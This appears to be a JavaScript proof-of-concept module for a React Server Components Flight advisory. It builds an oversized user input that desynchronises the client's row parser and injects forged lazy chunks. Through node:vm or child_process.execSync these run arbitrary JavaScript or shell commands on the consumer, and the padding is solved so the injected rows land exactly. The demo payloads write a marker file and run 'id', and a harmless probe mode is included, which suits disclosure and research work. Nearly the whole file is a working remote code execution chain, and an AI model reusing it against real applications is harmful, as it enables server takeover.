/**
 * Builds the attacker-controlled string for GHSA-xqc2-xf4c-x3h3.
 *
 * The string is handed to the application as ordinary user input - a comment, a
 * bio, a search query. React outlines any string of 1024 characters or more into
 * its own length-prefixed `T` row, so the bytes reach the wire completely
 * unescaped: quotes, newlines and all. On its own that is harmless, because the
 * client only ever reads those bytes as the body of that one row.
 *
 * The typed-array bug removes the containment. A binary row whose body was
 * dropped leaves the client reading `declaredLength` bytes of whatever follows,
 * so it swallows the `T` row's own header plus the first N bytes of the
 * attacker's string and then resumes row parsing at a byte offset the attacker
 * chose. From that offset on, the attacker's bytes *are* Flight rows.
 *
 *     ... 2:o<len>,            <- header written, body dropped (detached buffer)
 *         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ client reads <len> bytes from here
 *         3:T<len3>,PADDING..PADDING|m:{...}\nc:{...}\n3:"$c"\n
 *                                   ^ resync: everything after this is a row
 */

// Decodes to Symbol.for('react.lazy') via parseModelString's `$S` case, which
// puts no restriction on the symbol name.
const LAZY_SYMBOL_REF = '$Sreact.lazy';

export const GADGETS = {
  /**
   * `vm.runInThisContext(code, options)` compiles and runs its first argument
   * in the consumer's own global context.
   */
  vm: {
    specifier: 'node:vm',
    exportName: 'runInThisContext',
    describe: "vm.runInThisContext(<key>) - evaluates JavaScript in the consumer's realm",
  },
  /**
   * `child_process.execSync(command, options)` runs its first argument through
   * the shell. Useful when the target bundle externalises child_process but not
   * vm, and it makes the shell-level impact explicit.
   */
  exec: {
    specifier: 'node:child_process',
    exportName: 'execSync',
    describe: 'child_process.execSync(<key>) - runs a shell command',
  },
};

/**
 * The rows we want the client to parse once it resyncs.
 *
 * `getOutlinedModel` unwraps anything that looks like a React lazy node by
 * reading `value._payload` and treating it as one of its own chunk records -
 * status, value and reason included. Nothing checks that the object came from
 * React, so a plain object straight out of the payload is accepted as a chunk.
 *
 * Row `a` - forged chunk in the `resolved_module` state. `initializeModuleChunk`
 *   calls `requireModule(chunk.value)` on it, so the attacker supplies the
 *   client-reference metadata directly. `resolveClientReference` and the
 *   consumer manifest, the only thing that normally decides which modules a
 *   payload may reach, are bypassed entirely. The result is one arbitrary
 *   `__webpack_require__(id)` plus one arbitrary export read - here, a function
 *   that evaluates its first argument.
 *
 * Row `b` - forged chunk in the `resolved_model` state. In 19.2.8 such a chunk
 *   keeps the Response object itself in `reason`, and `initializeModelChunk`
 *   does:
 *
 *       const response = chunk.reason;
 *       const value = JSON.parse(chunk.value, response._fromJSON);
 *
 *   so the forged chunk supplies both the reviver and the document it is applied
 *   to. Pointing `_fromJSON` at row `a`'s function and putting the payload in a
 *   JSON *key* calls it as `gadget("<code>", {})`. That is the code execution.
 *
 * Row `<noteId>` refills the chunk id that the genuine response referenced for
 *   the attacker's string, so initializing the real root row reaches row `b` and
 *   the payload fires. The application never has to read, render or await the
 *   value.
 */
export function buildInjectedRows({code, noteIdHex, gadget = 'vm', ids = ['a', 'b']}) {
  const [moduleRow, callRow] = ids;
  const {specifier, exportName} = GADGETS[gadget] ?? GADGETS.vm;

  const moduleChunk = {
    $$typeof: LAZY_SYMBOL_REF,
    _payload: {
      status: 'resolved_module',
      // [moduleId, chunkIds, exportName] - the shape requireModule() expects.
      value: [specifier, [], exportName],
      _debugChunk: null,
    },
  };

  const callChunk = {
    $$typeof: LAZY_SYMBOL_REF,
    _payload: {
      status: 'resolved_model',
      // A JSON document whose *key* is the attacker's source text. JSON.parse
      // invokes the reviver as reviver(key, value, context), so the key lands in
      // the gadget's first parameter.
      value: JSON.stringify({[code]: {}}),
      // A stand-in Response. Only `_fromJSON` is ever read off it.
      reason: {_fromJSON: `$${moduleRow}`},
      // Read unguarded by initializeDebugChunk() in development builds.
      _debugChunk: null,
    },
  };

  return (
    `${moduleRow}:${JSON.stringify(moduleChunk)}\n` +
    `${callRow}:${JSON.stringify(callChunk)}\n` +
    `${noteIdHex}:${JSON.stringify('$' + callRow)}\n`
  );
}

/**
 * Solves for the padding that makes the resync point land exactly on the first
 * injected row.
 *
 * The client consumes `droppedRowLength` bytes starting right after the dropped
 * binary row's header. Those bytes are the attacker row's own header followed by
 * the start of the attacker's string, so:
 *
 *     padding = droppedRowLength - headerLength(noteByteLength)
 *
 * `headerLength` depends on the hex width of the note's byte length, which
 * depends on the padding, so this iterates to a fixed point. The payload is
 * ASCII only, so one character is one byte.
 */
export function alignPayload({droppedRowLength, noteIdHex, rows}) {
  const headerLength = noteByteLength =>
    noteIdHex.length +
    1 /* ':' */ +
    1 /* 'T' */ +
    noteByteLength.toString(16).length +
    1 /* ',' */;

  let noteByteLength = droppedRowLength + rows.length; // first guess
  for (let i = 0; i < 8; i++) {
    const header = headerLength(noteByteLength);
    const padding = droppedRowLength - header;
    const next = padding + rows.length;
    if (next === noteByteLength) {
      if (padding < 0) {
        throw new Error(
          `the dropped row declares only ${droppedRowLength} bytes, too few to ` +
            `cover the ${header}-byte header of the attacker's row`,
        );
      }
      return {padding, noteByteLength, headerLength: header};
    }
    noteByteLength = next;
  }
  throw new Error('payload alignment did not converge');
}

/**
 * A harmless replacement for the injected rows: it refills the note's chunk id
 * with a token and nothing else. If that token comes back as the rendered note,
 * the attacker's bytes were parsed as Flight rows - which is the whole finding,
 * demonstrated without compiling or running anything on the target.
 *
 * This is what `poc/remote.mjs --check` sends.
 */
export function buildProbeRows({noteIdHex, token}) {
  return `${noteIdHex}:${JSON.stringify(token)}\n`;
}

/**
 * Assembles the final user-supplied string.
 *
 * Pass `rows` to inject something other than the code-execution chain - see
 * `buildProbeRows`.
 */
export function buildNote({
  droppedRowLength,
  noteIdHex,
  code,
  gadget,
  rows: providedRows,
  padByte = '.',
}) {
  const rows = providedRows ?? buildInjectedRows({code, noteIdHex, gadget});
  const {padding, noteByteLength, headerLength} = alignPayload({
    droppedRowLength,
    noteIdHex,
    rows,
  });
  const note = padByte.repeat(padding) + rows;
  if (note.length !== noteByteLength) {
    throw new Error(`alignment mismatch: ${note.length} !== ${noteByteLength}`);
  }
  if (note.length < 1024) {
    throw new Error(
      `the note is ${note.length} characters; React only outlines strings of ` +
        `1024 characters or more into a raw T row`,
    );
  }
  return {note, padding, rows, resyncOffset: padding, headerLength, noteByteLength};
}

/**
 * The payload text, in whatever language the chosen gadget speaks.
 *
 * It travels as a JSON property name, so quotes and newlines are escaped for us
 * on the way out and the Flight row stays on one line regardless.
 *
 * Both variants write the same marker file, so `consume.mjs` can report the
 * evidence identically either way.
 */
export function buildExploitCode({markerPath, gadget = 'vm'}) {
  return gadget === 'exec'
    ? buildShellPayload(markerPath)
    : buildJavaScriptPayload(markerPath);
}

/**
 * A shell command for the `exec` gadget. `printf` with positional arguments
 * keeps the quoting manageable and produces JSON the driver can parse back.
 */
function buildShellPayload(markerPath) {
  const format =
    '{"proof": "shell command executed inside the RSC consumer",' +
    ' "pid": "%s", "user": "%s", "host": "%s", "cwd": "%s",' +
    ' "shellOutput": "%s", "at": "%s"}';
  return (
    `printf '${format}' "$$" "$(id -un)" "$(hostname)" "$(pwd)" "$(id)" ` +
    `"$(date -u +%Y-%m-%dT%H:%M:%SZ)" > '${markerPath}'`
  );
}

/**
 * JavaScript for the `vm` gadget. It is evaluated in the consumer's global
 * scope, where no module-local `require` exists - but `process` is a global and
 * `process.getBuiltinModule` hands out core modules from anywhere. Writing a
 * marker file plus the output of a spawned command leaves evidence that is hard
 * to argue with.
 */
function buildJavaScriptPayload(markerPath) {
  return `
    (function () {
      var fs = process.getBuiltinModule('node:fs');
      var cp = process.getBuiltinModule('node:child_process');
      var os = process.getBuiltinModule('node:os');
      fs.writeFileSync(${JSON.stringify(markerPath)}, JSON.stringify({
        proof: 'arbitrary code executed inside the RSC consumer',
        pid: process.pid,
        execPath: process.execPath,
        cwd: process.cwd(),
        user: os.userInfo().username,
        host: os.hostname(),
        shellOutput: cp.execSync('id', {encoding: 'utf8'}).trim(),
        at: new Date().toISOString()
      }, null, 2));
    })()
  `
    .replace(/\s+/g, ' ')
    .trim();
}
